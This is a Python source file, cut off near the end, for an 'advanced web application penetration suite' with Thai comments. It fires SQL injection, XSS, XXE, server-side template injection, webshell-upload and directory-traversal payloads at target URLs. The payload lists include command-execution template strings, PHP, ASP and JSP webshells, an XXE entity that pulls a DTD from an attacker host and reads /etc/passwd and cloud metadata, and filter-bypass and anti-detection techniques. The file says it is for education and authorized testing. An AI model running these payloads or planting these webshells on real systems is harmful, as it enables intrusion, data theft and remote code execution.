# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
🎯 ADVANCED WEB APPLICATION PENETRATION SUITE 2025 🎯
=====================================================

เครื่องมือ penetration testing สำหรับ web application ขั้นสูง
✅ รองรับเทคนิคการโจมตีและทดสอบความปลอดภัยแบบครบจบ
✅ พร้อม bypass techniques และ evasion methods

💡 Advanced Features:
- SQL Injection (Union, Boolean, Time-based, Error-based)
- XSS Testing (Reflected, Stored, DOM-based)
- XXE (XML External Entity) Attacks
- CSRF Token Bypass
- Authentication Bypass
- File Upload Vulnerabilities
- Directory Traversal & LFI/RFI
- Server-Side Template Injection (SSTI)
- NoSQL Injection
- GraphQL Vulnerabilities

🔗 Made for Educational/Authorized Testing only!
📚 Study materials for web security learning
"""

import requests
import random
import time
import re
import json
import base64
import urllib.parse
from urllib.parse import urljoin, quote, unquote
from bs4 import BeautifulSoup
import xml.etree.ElementTree as ET
from datetime import datetime
import hashlib
import itertools
import threading
from concurrent.futures import ThreadPoolExecutor
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedWebApplicationScanner:
    """
    🎯 Advanced Web Application Security Scanner
    - เครื่องมือสแกนหาช่องโหว่บน web application แบบครบจบ
    - รองรับเทคนิคการโจมตีและการหลบหลีกการตรวจจับ
    """

    def __init__(self):
        self.session = requests.Session()
        self.target_url = ""
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.cookies = {}

        # Anti-detection headers
        self.session.headers.update({
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        print("🎯 Advanced Web Application Scanner Initialized!")
        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")

class SQLInjectionScanner:
    """
    💉 Advanced SQL Injection Scanner
    - ทดสอบ SQL injection ทุกประเภท
    - รองรับ bypass techniques และ evasion methods
    """

    def __init__(self, session):
        self.session = session
        self.payloads = {
            'union_based': [
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT null,null,null,null,null--",
                "' UNION SELECT @@version,2,3,4,5--",
                "' UNION SELECT user(),database(),version(),4,5--",
                "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
                "' UNION SELECT column_name,2,3,4,5 FROM information_schema.columns WHERE table_name='users'--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
                "' AND ASCII(SUBSTRING(database(),1,1))>97--",
                "' AND (SELECT user())='root'--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "' OR (SELECT SLEEP(5))--",
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT SLEEP(5),2,3,4,5--",
                "' AND (SELECT COUNT(*) FROM users) AND SLEEP(5)--"
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--",
                "' AND EXP(~(SELECT * FROM (SELECT user())x))--"
            ],
            'bypass_filters': [
                "' /**/AND/**/1=1--",
                "' %20AND%201=1--",
                "' +AND+1=1--",
                "'/**/UNION/**/SELECT/**/1,2,3--",
                "' UNI/**/ON SEL/**/ECT 1,2,3--",
                "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
                "' UNiOn SeLeCt 1,2,3--",
                "' UNION(SELECT(1),2,3)--"
            ]
        }

        self.error_patterns = [
            r"mysql_fetch_array",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL.*Server",
            r"OLE DB.*SQL Server",
            r"Microsoft.*ODBC.*SQL Server",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Oracle database",
            r"SQLite/JDBCDriver",
            r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException"
        ]

    def test_parameter(self, url, param, value):
        """ทดสอบ SQL injection ในพารามิเตอร์"""
        vulnerabilities = []

        print(f"🔍 Testing parameter: {param}")

        # Test all payload types
        for category, payloads in self.payloads.items():
            print(f"  📋 Testing {category} payloads...")

            for payload in payloads[:3]:  # Test first 3 payloads of each type
                try:
                    # สร้าง test URL
                    test_value = value + payload
                    params = {param: test_value}

                    # ส่ง request
                    response = self.session.get(url, params=params, timeout=10)

                    # ตรวจสอบ error patterns
                    if self.check_sql_errors(response.text):
                        vulnerability = {
                            'type': 'SQL Injection',
                            'category': category,
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': self.extract_error_evidence(response.text)
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"🚨 Found {category} SQL injection in parameter: {param}")
                        break

                    # ตรวจสอบ time-based
                    if category == 'time_based':
                        start_time = time.time()
                        response = self.session.get(url, params=params, timeout=15)
                        elapsed_time = time.time() - start_time

                        if elapsed_time > 4:  # ถ้าใช้เวลามากกว่า 4 วินาที
                            vulnerability = {
                                'type': 'SQL Injection',
                                'category': 'Time-based',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'method': 'GET',
                                'evidence': f"Response time: {elapsed_time:.2f} seconds"
                            }
                            vulnerabilities.append(vulnerability)
                            print(f"🚨 Found time-based SQL injection in parameter: {param}")
                            break

                    time.sleep(0.1)  # หน่วงเวลาเล็กน้อย

                except Exception as e:
                    print(f"❌ Error testing payload: {e}")
                    continue

        return vulnerabilities

    def test_post_form(self, url, form_data):
        """ทดสอบ SQL injection ใน POST form"""
        vulnerabilities = []

        print(f"🔍 Testing POST form at: {url}")

        for param in form_data.keys():
            print(f"  📋 Testing parameter: {param}")

            for category, payloads in self.payloads.items():
                for payload in payloads[:2]:  # Test first 2 payloads
                    try:
                        # สร้าง test data
                        test_data = form_data.copy()
                        test_data[param] = form_data[param] + payload

                        # ส่ง POST request
                        response = self.session.post(url, data=test_data, timeout=10)

                        # ตรวจสอบ vulnerabilities
                        if self.check_sql_errors(response.text):
                            vulnerability = {
                                'type': 'SQL Injection',
                                'category': category,
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'method': 'POST',
                                'evidence': self.extract_error_evidence(response.text)
                            }
                            vulnerabilities.append(vulnerability)
                            print(f"🚨 Found {category} SQL injection in POST parameter: {param}")
                            break

                        time.sleep(0.1)

                    except Exception as e:
                        continue

        return vulnerabilities

    def check_sql_errors(self, content):
        """ตรวจสอบ SQL error ในเนื้อหา"""
        for pattern in self.error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def extract_error_evidence(self, content):
        """ดึงหลักฐาน error จากเนื้อหา"""
        for pattern in self.error_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                # ดึงข้อความรอบๆ error
                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)
                return content[start:end].strip()
        return "SQL error detected"

class XSSScanner:
    """
    🔥 Advanced XSS Scanner
    - ทดสอบ Cross-Site Scripting ทุกประเภท
    - รองรับ filter bypass และ context-aware testing
    """

    def __init__(self, session):
        self.session = session
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'attribute_based': [
                '" onmouseover="alert(\'XSS\')"',
                '\' onmouseover=\'alert("XSS")\'',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");var a=\'',
                '\";alert(\"XSS\");var a=\"'
            ],
            'filter_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',
                '<svg/onload=alert("XSS")>',
                '<img src=x:prompt(document.cookie) onerror=eval(src)>',
                '<%73cript>alert("XSS")</script>',
                '<iframe srcdoc="&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;">',
                '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
                '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
                '<object data="data:text/html,<script>alert(\'XSS\')</script>">'
            ],
            'context_specific': {
                'html_context': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>'
                ],
                'attribute_context': [
                    '" onmouseover="alert(\'XSS\')"',
                    '\' onmouseover=\'alert("XSS")\'',
                    '"><script>alert("XSS")</script>'
                ],
                'javascript_context': [
                    '\';alert("XSS");var a=\'',
                    '\";alert(\"XSS\");var a=\"',
                    '</script><script>alert("XSS")</script>'
                ],
                'url_context': [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    'vbscript:msgbox("XSS")'
                ]
            },
            'dom_based': [
                '#<script>alert("XSS")</script>',
                '#<img src=x onerror=alert("XSS")>',
                'javascript:alert(document.location.hash)',
                '#"><script>alert("XSS")</script>'
            ]
        }

    def test_parameter(self, url, param, value):
        """ทดสอบ XSS ในพารามิเตอร์"""
        vulnerabilities = []

        print(f"🔍 Testing XSS in parameter: {param}")

        # Test basic payloads
        for payload in self.payloads['basic']:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=10)

                if self.check_xss_reflection(response.text, payload):
                    vulnerability = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'category': 'Reflected',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': 'GET',
                        'evidence': self.extract_xss_evidence(response.text, payload)
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"🚨 Found reflected XSS in parameter: {param}")

                time.sleep(0.1)

            except Exception as e:
                continue

        # Test filter bypass payloads
        for payload in self.payloads['filter_bypass'][:5]:
            try:
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=10)

                if self.check_xss_reflection(response.text, payload):
                    vulnerability = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'category': 'Filter Bypass',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': 'GET',
                        'evidence': self.extract_xss_evidence(response.text, payload)
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"🚨 Found XSS filter bypass in parameter: {param}")

                time.sleep(0.1)

            except Exception as e:
                continue

        return vulnerabilities

    def test_form(self, url, form_data):
        """ทดสอบ XSS ใน form"""
        vulnerabilities = []

        print(f"🔍 Testing XSS in form at: {url}")

        for param in form_data.keys():
            for payload in self.payloads['basic'][:3]:
                try:
                    test_data = form_data.copy()
                    test_data[param] = payload

                    response = self.session.post(url, data=test_data, timeout=10)

                    if self.check_xss_reflection(response.text, payload):
                        vulnerability = {
                            'type': 'Cross-Site Scripting (XSS)',
                            'category': 'Reflected',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'POST',
                            'evidence': self.extract_xss_evidence(response.text, payload)
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"🚨 Found XSS in form parameter: {param}")

                    time.sleep(0.1)

                except Exception as e:
                    continue

        return vulnerabilities

    def check_xss_reflection(self, content, payload):
        """ตรวจสอบการ reflect ของ XSS payload"""
        # ตรวจสอบการ reflect แบบตรงๆ
        if payload in content:
            return True

        # ตรวจสอบการ reflect แบบ decoded
        decoded_payload = urllib.parse.unquote(payload)
        if decoded_payload in content:
            return True

        # ตรวจสอบ partial reflection
        key_parts = ['alert', 'script', 'onerror', 'onload', 'javascript']
        for part in key_parts:
            if part in payload.lower() and part in content.lower():
                return True

        return False

    def extract_xss_evidence(self, content, payload):
        """ดึงหลักฐาน XSS จากเนื้อหา"""
        index = content.find(payload)
        if index != -1:
            start = max(0, index - 100)
            end = min(len(content), index + len(payload) + 100)
            return content[start:end].strip()
        return "XSS payload reflected"

class XXEScanner:
    """
    📄 XML External Entity (XXE) Scanner
    - ทดสอบ XXE vulnerabilities
    - รองรับ file disclosure และ SSRF through XXE
    """

    def __init__(self, session):
        self.session = session
        self.payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root>&xxe;</root>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>
<root></root>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>'''
        ]

        self.indicators = [
            'root:x:0:0:',  # /etc/passwd
            '127.0.0.1',    # hosts file
            'localhost',    # hosts file
            'ami-id',       # AWS metadata
            'instance-id',  # AWS metadata
            'uid=',         # command execution result
            'gid='          # command execution result
        ]

    def test_endpoint(self, url, content_type='application/xml'):
        """ทดสอบ XXE ใน XML endpoint"""
        vulnerabilities = []

        print(f"🔍 Testing XXE at: {url}")

        for i, payload in enumerate(self.payloads):
            try:
                headers = {
                    'Content-Type': content_type,
                    'Accept': 'application/xml, text/xml'
                }

                response = self.session.post(url, data=payload, headers=headers, timeout=10)

                if self.check_xxe_indicators(response.text):
                    vulnerability = {
                        'type': 'XML External Entity (XXE)',
                        'category': 'File Disclosure',
                        'url': url,
                        'payload': payload.replace('\n', '\\n'),
                        'method': 'POST',
                        'evidence': self.extract_xxe_evidence(response.text)
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"🚨 Found XXE vulnerability!")

                time.sleep(0.2)

            except Exception as e:
                print(f"❌ Error testing XXE payload {i+1}: {e}")
                continue

        return vulnerabilities

    def check_xxe_indicators(self, content):
        """ตรวจสอบ indicators ของ XXE"""
        for indicator in self.indicators:
            if indicator in content:
                return True
        return False

    def extract_xxe_evidence(self, content):
        """ดึงหลักฐาน XXE จากเนื้อหา"""
        for indicator in self.indicators:
            index = content.find(indicator)
            if index != -1:
                start = max(0, index - 50)
                end = min(len(content), index + 200)
                return content[start:end].strip()
        return "XXE indicators found"

class SSTIScanner:
    """
    🏗️ Server-Side Template Injection Scanner
    - ทดสอบ SSTI vulnerabilities
    - รองรับ template engines หลายตัว
    """

    def __init__(self, session):
        self.session = session
        self.payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{request}}',
                '{{config.items()}}',
                '{{get_flashed_messages.__globals__.__builtins__.eval("__import__(\'os\').system(\'id\')")}}',
                '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self}}',
                '{{dump(app)}}',
                '{{1337*1337}}',
                '{{app.request.query.get("id")}}'
            ],
            'smarty': [
                '{7*7}',
                '{$smarty.version}',
                '{php}echo "id";{/php}',
                '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",false)}'
            ],
            'freemarker': [
                '${7*7}',
                '${product.getClass()}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\'/etc/passwd\').toURL().openStream().readAllBytes()?join(\' \')}'
            ],
            'velocity': [
                '#set($str=$class.inspect("java.lang.String").type)',
                '#set($chr=$class.inspect("java.lang.Character").type)',
                '#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
                '$ex.waitFor()',
                '#set($out=$ex.getInputStream())'
            ]
        }

        self.test_expressions = [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('{7*7}', '49'),
            ('{{1337*1337}}', '1787569'),
            ('${1337*1337}', '1787569'),
            ('{1337*1337}', '1787569')
        ]

    def test_parameter(self, url, param, value):
        """ทดสอบ SSTI ในพารามิเตอร์"""
        vulnerabilities = []

        print(f"🔍 Testing SSTI in parameter: {param}")

        # Test basic expressions first
        for expression, expected in self.test_expressions:
            try:
                params = {param: expression}
                response = self.session.get(url, params=params, timeout=10)

                if expected in response.text:
                    # Found basic SSTI, now test specific engines
                    template_engine = self.identify_template_engine(url, param, response.text)

                    vulnerability = {
                        'type': 'Server-Side Template Injection (SSTI)',
                        'category': f'{template_engine} Template Engine',
                        'url': url,
                        'parameter': param,
                        'payload': expression,
                        'method': 'GET',
                        'evidence': f"Expression '{expression}' evaluated to '{expected}'"
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"🚨 Found SSTI in parameter: {param} (Engine: {template_engine})")

                    # Test more advanced payloads for this engine
                    advanced_vulns = self.test_advanced_payloads(url, param, template_engine)
                    vulnerabilities.extend(advanced_vulns)
                    break

                time.sleep(0.1)

            except Exception as e:
                continue

        return vulnerabilities

    def identify_template_engine(self, url, param, response_content):
        """ระบุ template engine"""
        # Test engine-specific payloads
        engines = ['jinja2', 'twig', 'smarty', 'freemarker', 'velocity']

        for engine in engines:
            try:
                test_payload = self.payloads[engine][0]
                params = {param: test_payload}
                response = self.session.get(url, params=params, timeout=5)

                if engine == 'jinja2' and ('config' in response.text or 'flask' in response.text.lower()):
                    return 'Jinja2'
                elif engine == 'twig' and ('_self' in response.text):
                    return 'Twig'
                elif engine == 'smarty' and ('smarty' in response.text.lower()):
                    return 'Smarty'
                elif engine == 'freemarker' and ('freemarker' in response.text.lower()):
                    return 'FreeMarker'
                elif engine == 'velocity' and ('velocity' in response.text.lower()):
                    return 'Velocity'

            except Exception:
                continue

        return 'Unknown'

    def test_advanced_payloads(self, url, param, engine):
        """ทดสอบ payload ขั้นสูงสำหรับ engine เฉพาะ"""
        vulnerabilities = []
        engine_key = engine.lower().replace(' ', '')

        if engine_key in self.payloads:
            for payload in self.payloads[engine_key][1:3]:  # Test 2 more payloads
                try:
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=10)

                    # Check for command execution indicators
                    if self.check_command_execution(response.text):
                        vulnerability = {
                            'type': 'Server-Side Template Injection (SSTI)',
                            'category': f'{engine} Command Execution',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'evidence': self.extract_command_evidence(response.text)
                        }
                        vulnerabilities.append(vulnerability)
                        print(f"🚨 Found SSTI command execution: {param}")

                    time.sleep(0.2)

                except Exception as e:
                    continue

        return vulnerabilities

    def check_command_execution(self, content):
        """ตรวจสอบผลลัพธ์ของการ execute command"""
        indicators = ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash', 'bin/sh']
        for indicator in indicators:
            if indicator in content:
                return True
        return False

    def extract_command_evidence(self, content):
        """ดึงหลักฐานการ execute command"""
        indicators = ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash']
        for indicator in indicators:
            index = content.find(indicator)
            if index != -1:
                start = max(0, index - 20)
                end = min(len(content), index + 100)
                return content[start:end].strip()
        return "Command execution indicators found"

class FileUploadScanner:
    """
    📁 File Upload Vulnerability Scanner
    - ทดสอบช่องโหว่การอัปโหลดไฟล์
    - รองรับ bypass techniques หลายแบบ
    """

    def __init__(self, session):
        self.session = session
        self.malicious_files = {
            'php_webshell': {
                'filename': 'shell.php',
                'content': '<?php system($_GET["cmd"]); ?>',
                'content_type': 'application/x-php'
            },
            'php_bypass_1': {
                'filename': 'shell.php.jpg',
                'content': '<?php system($_GET["cmd"]); ?>',
                'content_type': 'image/jpeg'
            },
            'php_bypass_2': {
                'filename': 'shell.phtml',
                'content': '<?php system($_GET["cmd"]); ?>',
                'content_type': 'text/html'
            },
            'asp_webshell': {
                'filename': 'shell.asp',
                'content': '<%eval request("cmd")%>',
                'content_type': 'text/html'
            },
            'jsp_webshell': {
                'filename': 'shell.jsp',
                'content': '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                'content_type': 'text/html'
            },
            'htaccess_bypass': {
                'filename': '.htaccess',
                'content': 'AddType application/x-httpd-php .jpg',
                'content_type': 'text/plain'
            }
        }

    def test_upload_endpoint(self, url, file_param='file'):
        """ทดสอบ endpoint สำหรับอัปโหลดไฟล์"""
        vulnerabilities = []

        print(f"🔍 Testing file upload at: {url}")

        for file_type, file_info in self.malicious_files.items():
            try:
                # สร้างไฟล์สำหรับอัปโหลด
                files = {
                    file_param: (
                        file_info['filename'],
                        file_info['content'],
                        file_info['content_type']
                    )
                }

                # ส่ง request อัปโหลด
                response = self.session.post(url, files=files, timeout=10)

                # ตรวจสอบการอัปโหลดสำเร็จ
                if self.check_upload_success(response.text, file_info['filename']):
                    vulnerability = {
                        'type': 'File Upload Vulnerability',
                        'category': file_type,
                        'url': url,
                        'filename': file_info['filename'],
                        'payload': file_info['content'],
                        'method': 'POST',
                        'evidence': self.extract_upload_evidence(response.text, file_info['filename'])
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"🚨 File upload vulnerability found: {file_type}")

                time.sleep(0.2)

            except Exception as e:
                print(f"❌ Error testing {file_type}: {e}")
                continue

        return vulnerabilities

    def check_upload_success(self, content, filename):
        """ตรวจสอบการอัปโหลดสำเร็จ"""
        success_indicators = [
            'upload successful',
            'file uploaded',
            'upload complete',
            filename,
            'successfully uploaded',
            'file saved'
        ]

        content_lower = content.lower()
        for indicator in success_indicators:
            if indicator.lower() in content_lower:
                return True

        return False

    def extract_upload_evidence(self, content, filename):
        """ดึงหลักฐานการอัปโหลด"""
        # หา path หรือ URL ของไฟล์ที่อัปโหลด
        import re

        # หา URL pattern
        url_patterns = [
            rf'https?://[^\s]+{filename}',
            rf'/[^\s]*{filename}',
            rf'uploads?/[^\s]*{filename}'
        ]

        for pattern in url_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(0)

        # หาข้อความรอบ filename
        index = content.lower().find(filename.lower())
        if index != -1:
            start = max(0, index - 50)
            end = min(len(content), index + len(filename) + 50)
            return content[start:end].strip()

        return "Upload success indicators found"

class DirectoryTraversalScanner:
    """
    📂 Directory Traversal & LFI Scanner
    - ทดสอบช่องโหว่ Directory Traversal และ Local File Inclusion
    - รองรับ bypass techniques หลายแบบ
    """

    def __init__(self, session):
        self.session = session
        self.payloads = [
            # Basic traversal
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../etc/hosts',

            # URL encoded
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',

            # Double URL encoded
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',

            # Using null bytes (older systems)
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',

            # Using different encodings
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',

            # Filter bypass attempts
            '....//....//....//etc/passwd',
            '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',

            # Absolute path attempts
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '/proc/version',
            '/proc/self/environ',

            # PHP wrappers (for LFI)
            'php://filter/read=convert.base64-encode/resource=index.php',
            'file:///etc/passwd',
            'expect://id',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B'
        ]

        self.linux_files = [
            '/etc/passwd',
            '/etc/hosts',
            '/proc/version',
            '/proc/self/environ',
            '/etc/issue',
            '/etc/group',
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log'
        ]

        self.windows_files = [
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\win.ini',
            'C:\\windows\\system.ini',
            'C:\\boot.ini',
            'C:\\windows\\repair\\sam'
        ]

        self.indicators = [
            'root:x:0:0:',      # /etc/passwd
            '127.0.0.1',        # hosts file
            'localhost',        # hosts file
            'Linux version',    # /proc/version
            'Microsoft Windows', # Windows files
            'for 16-bit app',   # win.ini
            '[fonts]',          # win.ini
            '[extensions]'      # win.ini
        ]

    def test_parameter(self, url, param, value):
        """ทดสอบ Directory Traversal ในพารามิเตอร์"""
        vulnerabilities = []

        print(f"🔍 Testing Directory Traversal in parameter: {param}")

        for payload in self.payloads[:10]:  # Test first 10 payloads
            try:
                params = {param: payload}
                response = self.session.get(url, params=params, timeout=10)

                if self.check_file_disclosure(response.text):
                    vulnerability = {
                        'type': 'Directory Traversal / LFI',
                        'category': 'File Disclosure',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'method': 'GET',
                        'evidence': self.extract_file_evidence(response.text)
                    }
                    vulnerabilities.append(vulnerability)
                    print(f"🚨 Found Directory Traversal in parameter: {param}")

                time.sleep(0.1)

            except Exception as e:
                continue

        return vulnerabilities

    def check_file_disclosure(self, content):
        """ตรวจสอบการเปิดเผยไฟล์"""
        for indicator in self.indicators:
            if indicator in content:
                return True
        return False

    def extract_file_evidence(self, content):
        """ดึงหลักฐานการเปิดเผยไฟล์"""
        for indicator in self.indicators:
            index = content.find(indicator)
            if index != -1:
                start = max(0, index - 30)
                end = min(len(content), index + 200)
                return content[start:end].strip()
        return "File disclosure indicators found"

# 🎯 Demo Functions
def demo_sql_injection():
    """Demo: SQL Injection testing"""
    print("\n" + "="*60)
    print("💉 DEMO: SQL Injection Testing")
    print("="*60)

    session = requests.Session()
    scanner = SQLInjectionScanner(session)

    # ตัวอย่างการทดสอบ (ใช้ URL ปลอดภัย)
    test_url = "https://httpbin.org/get"
    test_param = "id"
    test_value = "1"

    print(f"🎯 Testing URL: {test_url}")
    print(f"📋 Parameter: {test_param}")

    # ทดสอบ payloads (จะไม่เจอ vulnerability จริงๆ แต่จะเห็น process)
    print("\n🔍 Testing SQL injection payloads...")
    vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)

    if vulnerabilities:
        print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln['category']}")
    else:
        print("✅ No vulnerabilities found (expected for httpbin.org)")

def demo_xss_testing():
    """Demo: XSS testing"""
    print("\n" + "="*60)
    print("🔥 DEMO: XSS Testing")
    print("="*60)

    session = requests.Session()
    scanner = XSSScanner(session)

    # ตัวอย่างการทดสอบ
    test_url = "https://httpbin.org/get"
    test_param = "search"
    test_value = "test"

    print(f"🎯 Testing URL: {test_url}")
    print(f"📋 Parameter: {test_param}")

    print("\n🔍 Testing XSS payloads...")
    vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)

    if vulnerabilities:
        print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln['category']}")
    else:
        print("✅ No vulnerabilities found (expected for httpbin.org)")

def demo_xxe_testing():
    """Demo: XXE testing"""
    print("\n" + "="*60)
    print("📄 DEMO: XXE Testing")
    print("="*60)

    session = requests.Session()
    scanner = XXEScanner(session)

    # ตัวอย่างการทดสอบ
    test_url = "https://httpbin.org/post"

    print(f"🎯 Testing URL: {test_url}")
    print("\n🔍 Testing XXE payloads...")

    vulnerabilities = scanner.test_endpoint(test_url)

    if vulnerabilities:
        print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln['category']}")
    else:
        print("✅ No vulnerabilities found (expected for httpbin.org)")

def demo_ssti_testing():
    """Demo: SSTI testing"""
    print("\n" + "="*60)
    print("🏗️ DEMO: SSTI Testing")
    print("="*60)

    session = requests.Session()
    scanner = SSTIScanner(session)

    # ตัวอย่างการทดสอบ
    test_url = "https://httpbin.org/get"
    test_param = "template"
    test_value = "user"

    print(f"🎯 Testing URL: {test_url}")
    print(f"📋 Parameter: {test_param}")

    print("\n🔍 Testing SSTI payloads...")
    vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)

    if vulnerabilities:
        print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
        for vuln in vulnerabilities:
            print(f"  - {vuln['type']}: {vuln['category']}")
    else:
        print("✅ No vulnerabilities found (expected for httpbin.org)")

def demo_file_upload_testing():
    """Demo: File upload testing"""
    print("\n" + "="*60)
    print("📁 DEMO: File Upload Testing")
    print("="*60)

    session = requests.Session()
    scanner = FileUploadScanner(session)

    # ตัวอย่างการทดสอบ
    test_url = "https://httpbin.org/post"

    print(f"🎯 Testing URL: {test_url}")
    print("\n🔍 Testing file upload vulnerabilities...")

    vulnerabilities = scanner.test_upload_endpoint(test_url)

    if vulnerabilities:
        print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
